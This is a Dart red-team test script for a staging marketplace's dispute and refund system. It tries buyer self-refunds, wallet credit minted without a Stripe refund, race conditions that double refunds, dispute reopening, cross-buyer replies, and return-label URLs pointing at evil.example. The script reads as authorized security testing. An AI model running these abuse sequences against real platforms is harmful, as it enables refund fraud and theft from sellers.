/// REDTEAM_BLIND_O pass 2 — return/stock/partial/races (staging, no fixes).
import 'dart:io';

import '_rto.dart';

Future<void> main() async {
  final c = Rto.fromEnv(loadEnv());
  await c.loginActors();
  await c.ensureBuyer2();
  await c.ensureSeller2();
  final w0 = await c.wallets();

  // ========== O4/O8 — buyer self-deal 100% via INSERT percent + RPC ==========
  final a = await c.payAndComplete(lens: 'O4');
  if (a == null) {
    stderr.writeln('fixture A failed');
    return;
  }
  final insA = await c.insertDispute(a, extra: {
    'seller_refund_percent': 100,
    'seller_offer_type': 'partial_refund',
    'buyer_decision': 'accepted_partial_refund',
  });
  final rowA = await c.disputeRow(a);
  final rpcA = await c.rpc(
    'batata_process_partial_refund_dispute',
    {'p_order_id': a, 'p_refund_percent': 100},
    jwt: c.buyerJwt,
  );
  final wA = await c.wallets();
  final txA = await c.walletTxns(orderId: a);
  final ordA = await c.orderRow(a);
  c.note('p2.o4.selfdeal_insert', 'INSERT %100 + RPC parcial', {
    'insert': insA.brief,
    'dispute': rowA,
    'rpc': rpcA.brief,
    'w0': w0,
    'w1': wA,
    'txns': txA,
    'order': {
      'status': ordA?['status'],
      'release': ordA?['wallet_release_processed_at'],
      'refund_flag': ordA?['wallet_refund_processed_at'],
      'stripe_refund': ordA?['stripe_refund_id'],
      'pi': ordA?['stripe_payment_intent_id'],
    },
  }, lens: 'O4');
  final dBuyerA = ((wA['buyer'] ?? 0) - (w0['buyer'] ?? 0));
  if (rpcA.ok && rpcA.body.contains('true') && dBuyerA > 0) {
    c.hold(
      id: 'RTO-O4-selfdeal-partial-100',
      lens: 'O4',
      severity: 'P0',
      title: 'Comprador mintou reembolso 100% sem oferta do vendedor (Stripe ainda capturado)',
      actor: 'buyer JWT',
      pre: 'Stripe TEST pago+enviado+concluido',
      repro: 'POST order_disputes seller_refund_percent=100 + rpc batata_process_partial_refund_dispute',
      expected: 'percent stripped; RPC false / dispute_refund_offer_required; Δwallet=0',
      obtained: 'rpc=${rpcA.brief} Δbuyer=$dBuyerA stripe_refund=${ordA?['stripe_refund_id']}',
      evidence: {'dispute': rowA, 'txns': txA, 'order': ordA},
    );
  }

  // ========== O4 — buyer PATCH percent after clean insert ==========
  final b = await c.payAndComplete(lens: 'O4');
  if (b != null) {
    final insB = await c.insertDispute(b);
    final patchPct = await c.rest(
      'PATCH',
      'order_disputes?order_id=eq.$b',
      jwt: c.buyerJwt,
      body: {
        'seller_refund_percent': 100,
        'seller_offer_type': 'partial_refund',
      },
    );
    final rowB = await c.disputeRow(b);
    final rpcB = await c.rpc(
      'batata_process_partial_refund_dispute',
      {'p_order_id': b, 'p_refund_percent': 100},
      jwt: c.buyerJwt,
    );
    c.note('p2.o4.patch_percent', 'buyer PATCH % + RPC', {
      'insert': insB.brief,
      'patch': patchPct.brief,
      'dispute': rowB,
      'rpc': rpcB.brief,
      'wallets': await c.wallets(),
    }, lens: 'O4');
    final pct = rowB?['seller_refund_percent'];
    if (pct != null && (pct is num ? pct >= 100 : '$pct' == '100')) {
      c.hold(
        id: 'RTO-O4-buyer-writes-percent',
        lens: 'O4',
        severity: 'P1',
        title: 'Comprador grava seller_refund_percent=100 na disputa',
        actor: 'buyer JWT',
        pre: 'disputa aberta',
        repro: 'PATCH order_disputes seller_refund_percent=100',
        expected: 'campo permanece null (só vendedor)',
        obtained: 'percent=$pct rpc=${rpcB.brief}',
        evidence: {'dispute': rowB},
      );
    }
  }

  // ========== O4 — seller offer 100% (legit path) + Stripe residual ==========
  final d = await c.payAndComplete(lens: 'O4');
  Map<String, num> wBeforeSellerOffer = await c.wallets();
  if (d != null) {
    final insD = await c.insertDispute(d);
    await c.rest('PATCH', 'orders?id=eq.$d', jwt: c.buyerJwt, body: {
      'status': 'pedido_devolucao',
    });
    final offer = await c.rest(
      'PATCH',
      'order_disputes?order_id=eq.$d',
      jwt: c.sellerJwt,
      body: {
        'seller_refund_percent': 100,
        'seller_offer_type': 'partial_refund',
        'status': 'respondida_vendedor',
      },
    );
    final rowD = await c.disputeRow(d);
    final rpcD = await c.rpc(
      'batata_process_partial_refund_dispute',
      {'p_order_id': d, 'p_refund_percent': 1},
      jwt: c.buyerJwt,
    );
    final wD = await c.wallets();
    final ordD = await c.orderRow(d);
    final refAfter = await c.edge('refund-order', {'order_id': d}, jwt: c.sellerJwt);
    c.note('p2.o4.seller_offer_100', 'vendedor 100% + RPC + refund-order', {
      'insert': insD.brief,
      'offer': offer.brief,
      'dispute': rowD,
      'rpc': rpcD.brief,
      'delta_buyer': (wD['buyer'] ?? 0) - (wBeforeSellerOffer['buyer'] ?? 0),
      'delta_seller': (wD['seller'] ?? 0) - (wBeforeSellerOffer['seller'] ?? 0),
      'txns': await c.walletTxns(orderId: d),
      'order': ordD,
      'refund_order': refAfter.brief,
    }, lens: 'O4');
    final db = (wD['buyer'] ?? 0) - (wBeforeSellerOffer['buyer'] ?? 0);
    if (rpcD.body.contains('true') &&
        db > 0 &&
        (ordD?['stripe_refund_id'] == null || '${ordD?['stripe_refund_id']}' == '')) {
      c.hold(
        id: 'RTO-O4-wallet-mint-sem-stripe',
        lens: 'O4',
        severity: 'P1',
        title: 'Reembolso parcial 100% credita carteira sem anular o PaymentIntent Stripe',
        actor: 'buyer JWT após oferta seller',
        pre: 'Stripe TEST capturado; seller_refund_percent=100',
        repro: 'rpc batata_process_partial_refund_dispute; PI continua succeeded',
        expected: 'Stripe refund do PI ou sem mint de carteira',
        obtained: 'Δbuyer=$db stripe_refund=${ordD?['stripe_refund_id']} refund-order=${refAfter.brief}',
        evidence: {'order': ordD, 'rpc': rpcD.brief},
      );
    }
  }

  // ========== O3 — return FSM + stock ==========
  final e = await c.payAndComplete(lens: 'O3');
  if (e != null) {
    final ordE0 = await c.orderRow(e);
    final pidE = '${ordE0?['product_id']}';
    final qty0 = (await c.productRow(pidE))?['quantity'];
    final insE = await c.insertDispute(e);
    final pd = await c.rest('PATCH', 'orders?id=eq.$e', jwt: c.buyerJwt, body: {
      'status': 'pedido_devolucao',
    });
    final qtyPd = (await c.productRow(pidE))?['quantity'];
    final envDuring = await c.markEnviado(e);
    final concDuring = await c.markConcluido(e);
    final offerRet = await c.rest(
      'PATCH',
      'order_disputes?order_id=eq.$e',
      jwt: c.sellerJwt,
      body: {
        'seller_offer_type': 'return',
        'seller_pays_return_shipping': false,
        'status': 'respondida_vendedor',
      },
    );
    final acceptRet = await c.rest(
      'PATCH',
      'order_disputes?order_id=eq.$e',
      jwt: c.buyerJwt,
      body: {'buyer_decision': 'accepted_return'},
    );
    final emDev = await c.rest('PATCH', 'orders?id=eq.$e', jwt: c.buyerJwt, body: {
      'status': 'em_devolucao',
    });
    final devEnt = await c.rest('PATCH', 'orders?id=eq.$e', jwt: c.buyerJwt, body: {
      'status': 'devolucao_entregue',
    });
    final wBeforeDev = await c.wallets();
    final sellerDev = await c.rest('PATCH', 'orders?id=eq.$e', jwt: c.sellerJwt, body: {
      'status': 'devolvida',
    });
    final buyerDev = await c.rest('PATCH', 'orders?id=eq.$e', jwt: c.buyerJwt, body: {
      'status': 'devolvida',
    });
    final ordE1 = await c.orderRow(e);
    final prodE1 = await c.productRow(pidE);
    final wAfterDev = await c.wallets();
    c.note('p2.o3.return_fsm', 'FSM devolução + stock', {
      'insert': insE.brief,
      'pedido_dev': pd.brief,
      'qty0': qty0,
      'qty_after_pedido': qtyPd,
      'enviado_during': envDuring.brief,
      'concluido_during': concDuring.brief,
      'offer_return': offerRet.brief,
      'accept_return': acceptRet.brief,
      'em_devolucao': emDev.brief,
      'devolucao_entregue': devEnt.brief,
      'seller_devolvida': sellerDev.brief,
      'buyer_devolvida': buyerDev.brief,
      'order': ordE1,
      'product': prodE1,
      'delta_buyer': (wAfterDev['buyer'] ?? 0) - (wBeforeDev['buyer'] ?? 0),
      'delta_seller': (wAfterDev['seller'] ?? 0) - (wBeforeDev['seller'] ?? 0),
      'txns': await c.walletTxns(orderId: e),
    }, lens: 'O3');

    final qty1 = prodE1?['quantity'];
    final dbE = (wAfterDev['buyer'] ?? 0) - (wBeforeDev['buyer'] ?? 0);
    if (ordE1?['status'] == 'devolvida' &&
        dbE > 0 &&
        qty1 is num &&
        qty0 is num &&
        qty1 > qty0 &&
        (ordE1?['stripe_refund_id'] == null || '${ordE1?['stripe_refund_id']}' == '')) {
      c.hold(
        id: 'RTO-O3-devolvida-mint-stock-sem-stripe',
        lens: 'O3',
        severity: 'P1',
        title: 'devolvida restaura stock e minta carteira sem refund Stripe (artigo ainda no comprador)',
        actor: 'buyer FSM + seller PATCH devolvida',
        pre: 'comprador marca devolucao_entregue sem prova de envio',
        repro: 'pedido_devolucao→em_devolucao→devolucao_entregue→seller devolvida',
        expected: 'refund Stripe ou hold stock até etiqueta/carrier',
        obtained: 'Δbuyer=$dbE qty $qty0→$qty1 stripe_refund=${ordE1?['stripe_refund_id']}',
        evidence: {'order': ordE1, 'product': prodE1},
      );
    }
  }

  // ========== O2/O5 race enviado ∥ disputa; concluido ∥ disputa ==========
  final f = await c.payToPago(lens: 'O2');
  if (f != null) {
    final race1 = await parallel([
      c.markEnviado(f.oid),
      c.insertDispute(f.oid),
    ]);
    c.note('p2.o2.race_enviado_disp', 'enviado ∥ disputa', {
      'enviado': race1[0].brief,
      'dispute': race1[1].brief,
      'order': await c.orderRow(f.oid),
      'disp': await c.disputeRow(f.oid),
    }, lens: 'O2');
    await c.markEnviado(f.oid);
    final race2 = await parallel([
      c.markConcluido(f.oid),
      c.insertDispute(f.oid),
    ]);
    c.note('p2.o5.race_conc_disp', 'concluido ∥ disputa', {
      'concluido': race2[0].brief,
      'dispute': race2[1].brief,
      'order': await c.orderRow(f.oid),
      'disp': await c.disputeRow(f.oid),
    }, lens: 'O5');
  }

  // ========== O5 — buyer re-concluido during disputa (keep item + drop claim) ==========
  final g = await c.payAndComplete(lens: 'O5');
  if (g != null) {
    await c.insertDispute(g);
    await c.rest('PATCH', 'orders?id=eq.$g', jwt: c.buyerJwt, body: {
      'status': 'pedido_devolucao',
    });
    final reConc = await c.markConcluido(g);
    final close = await c.rest(
      'PATCH',
      'order_disputes?order_id=eq.$g',
      jwt: c.buyerJwt,
      body: {'status': 'resolvida'},
    );
    final rel = await c.rpc(
      'batata_release_seller_wallet_for_order',
      {'p_order_id': g},
      jwt: c.buyerJwt,
    );
    final closeS = await c.rest(
      'PATCH',
      'order_disputes?order_id=eq.$g',
      jwt: c.sellerJwt,
      body: {'status': 'resolvida'},
    );
    c.note('p2.o5.reconcluido_release', 'disputa→concluido→release', {
      're_concluido': reConc.brief,
      'close_buyer': close.brief,
      'release': rel.brief,
      'close_seller': closeS.brief,
      'order': await c.orderRow(g),
      'dispute': await c.disputeRow(g),
      'wallets': await c.wallets(),
      'txns': await c.walletTxns(orderId: g),
    }, lens: 'O5');
  }

  // ========== O6/O7 — proof_url buyer, label URL, label fee ==========
  final h = await c.payAndComplete(lens: 'O7');
  if (h != null) {
    final proofB = await c.rest('PATCH', 'orders?id=eq.$h', jwt: c.buyerJwt, body: {
      'proof_url': 'https://evil.example/b',
    });
    await c.insertDispute(h);
    final labelEvil = await c.rest(
      'PATCH',
      'order_disputes?order_id=eq.$h',
      jwt: c.buyerJwt,
      body: {'return_label_url': 'https://evil.example/label.pdf'},
    );
    final labelFleaber = await c.rest(
      'PATCH',
      'order_disputes?order_id=eq.$h',
      jwt: c.buyerJwt,
      body: {'return_label_url': 'https://fleaber.app/https://evil.example/x'},
    );
    final labelAt = await c.rest(
      'PATCH',
      'order_disputes?order_id=eq.$h',
      jwt: c.buyerJwt,
      body: {
        'return_label_created_at': DateTime.now().toUtc().toIso8601String(),
        'buyer_decision': 'accepted_return',
        'seller_pays_return_shipping': false,
      },
    );
    final wH0 = await c.wallets();
    final rfH = await c.rpc(
      'batata_refund_buyer_wallet_for_order',
      {'p_order_id': h},
      jwt: c.buyerJwt,
    );
    final wH1 = await c.wallets();
    c.note('p2.o7.label_proof', 'proof_url + label + fee', {
      'proof_buyer': proofB.brief,
      'label_evil': labelEvil.brief,
      'label_fleaber_wrap': labelFleaber.brief,
      'label_at': labelAt.brief,
      'dispute': await c.disputeRow(h),
      'order_proof': (await c.orderRow(h))?['proof_url'],
      'rpc_refund': rfH.brief,
      'delta_buyer': (wH1['buyer'] ?? 0) - (wH0['buyer'] ?? 0),
    }, lens: 'O7');
    final wrap = (await c.disputeRow(h))?['return_label_url'];
    if (wrap != null && '$wrap'.contains('evil.example')) {
      c.hold(
        id: 'RTO-O7-label-url-wrap',
        lens: 'O7',
        severity: 'P2',
        title: 'return_label_url aceita wrap fleaber.app → domínio hostil',
        actor: 'buyer JWT',
        pre: 'disputa aberta',
        repro: 'PATCH return_label_url=https://fleaber.app/https://evil.example/x',
        expected: 'só paths Fleaber reais',
        obtained: '$wrap',
      );
    }
  }

  // ========== O6 — tracking columns via OpenAPI / garbage PATCH ==========
  final i = await c.payToPago(lens: 'O6');
  if (i != null) {
    for (final col in [
      'tracking_code',
      'tracking_number',
      'carrier',
      'shipping_tracking',
      'label_url',
      'ctt_tracking',
    ]) {
      final hit = await c.rest(
        'PATCH',
        'orders?id=eq.${i.oid}',
        jwt: c.sellerJwt,
        body: {col: 'ALIEN-TRACK-999'},
      );
      c.note('p2.o6.col.$col', 'PATCH $col', hit.brief, lens: 'O6');
    }
  }

  // ========== O1 — reopen after resolvida; replies B2 ==========
  final j = await c.payAndComplete(lens: 'O1');
  if (j != null) {
    final insJ = await c.insertDispute(j);
    final did = insJ.firstId ?? (await c.disputeRow(j))?['id'];
    final closeJ = await c.rest(
      'PATCH',
      'order_disputes?order_id=eq.$j',
      jwt: c.buyerJwt,
      body: {'status': 'resolvida'},
    );
    final reopen = await c.insertDispute(j);
    HttpHit? replyB2;
    if (did != null) {
      replyB2 = await c.rest('POST', 'order_dispute_replies', jwt: c.buyer2Jwt, body: {
        'dispute_id': did,
        'sender_id': c.buyer2Id,
        'message': '$prefix hijack reply',
        'proof_photos': <String>[],
      });
    }
    final esc = await c.rest(
      'PATCH',
      'order_disputes?order_id=eq.$j',
      jwt: c.buyerJwt,
      body: {'status': 'escalada_fleaber', 'current_turn': 'administracao'},
    );
    c.note('p2.o1.reopen_replies', 'reopen + reply B2 + escalate', {
      'close': closeJ.brief,
      'reopen': reopen.brief,
      'reply_b2': replyB2?.brief,
      'escalate_after_resolvida': esc.brief,
      'dispute': await c.disputeRow(j),
    }, lens: 'O1');
    if (reopen.ok) {
      c.hold(
        id: 'RTO-O1-reopen-after-close',
        lens: 'O1',
        severity: 'P1',
        title: 'Segunda disputa na mesma encomenda após resolvida',
        actor: 'buyer JWT',
        pre: 'disputa resolvida',
        repro: 'POST order_disputes outra vez',
        expected: 'dispute_already_exists_for_order',
        obtained: reopen.brief,
      );
    }
    if (replyB2 != null && replyB2.ok) {
      c.hold(
        id: 'RTO-O1-reply-b2',
        lens: 'O1',
        severity: 'P2',
        title: '2.º comprador escreve na disputa alheia',
        actor: 'buyer2 JWT',
        pre: 'disputa de B1',
        repro: 'POST order_dispute_replies',
        expected: '403',
        obtained: replyB2.brief,
      );
    }
  }

  // ========== O8 race partial ∥ devolvida ==========
  final k = await c.payAndComplete(lens: 'O8');
  if (k != null) {
    await c.insertDispute(k);
    await c.rest('PATCH', 'orders?id=eq.$k', jwt: c.buyerJwt, body: {
      'status': 'pedido_devolucao',
    });
    await c.rest('PATCH', 'order_disputes?order_id=eq.$k', jwt: c.sellerJwt, body: {
      'seller_refund_percent': 50,
      'seller_offer_type': 'partial_refund',
    });
    await c.rest('PATCH', 'orders?id=eq.$k', jwt: c.buyerJwt, body: {
      'status': 'em_devolucao',
    });
    await c.rest('PATCH', 'orders?id=eq.$k', jwt: c.buyerJwt, body: {
      'status': 'devolucao_entregue',
    });
    final wK0 = await c.wallets();
    final raceK = await parallel([
      c.rpc(
        'batata_process_partial_refund_dispute',
        {'p_order_id': k, 'p_refund_percent': 50},
        jwt: c.buyerJwt,
      ),
      c.rest('PATCH', 'orders?id=eq.$k', jwt: c.sellerJwt, body: {
        'status': 'devolvida',
      }),
    ]);
    final wK1 = await c.wallets();
    final txK = await c.walletTxns(orderId: k);
    c.note('p2.o8.race_partial_devolvida', 'parcial ∥ devolvida', {
      'rpc': raceK[0].brief,
      'devolvida': raceK[1].brief,
      'delta_buyer': (wK1['buyer'] ?? 0) - (wK0['buyer'] ?? 0),
      'delta_seller': (wK1['seller'] ?? 0) - (wK0['seller'] ?? 0),
      'txns': txK,
      'order': await c.orderRow(k),
    }, lens: 'O8');
    final sumReemb = txK
        .where((t) => t is Map && t['type'] == 'reembolso')
        .fold<num>(0, (s, t) => s + ((t as Map)['amount'] as num? ?? 0));
    if (sumReemb > 6) {
      c.hold(
        id: 'RTO-O8-double-refund-race',
        lens: 'O8',
        severity: 'P0',
        title: 'Corrida reembolso parcial ∥ devolvida duplica crédito ao comprador',
        actor: 'buyer RPC ∥ seller PATCH',
        pre: 'disputa com oferta 50% + devolucao_entregue',
        repro: 'Future.wait process_partial_refund ∥ status=devolvida',
        expected: 'um só crédito ≤ price_total',
        obtained: 'reembolso_sum=$sumReemb Δbuyer=${(wK1['buyer'] ?? 0) - (wK0['buyer'] ?? 0)}',
        evidence: {'txns': txK, 'order': await c.orderRow(k)},
      );
    }
  }

  final out = {
    'auditor': 'REDTEAM_BLIND_O_DISPUTA_ENVIO_v1',
    'pass': 2,
    'production_touched': false,
    'fase4': false,
    'corrections_applied': false,
    'wallets0': w0,
    'wallets_end': await c.wallets(),
    'notes': c.notes,
    'findings': c.findings,
    'orders': c.createdOrderIds,
  };
  await dumpJson('${outDir()}/pass2.json', out);
  stdout.writeln('WROTE pass2.json findings=${c.findings.length}');
}
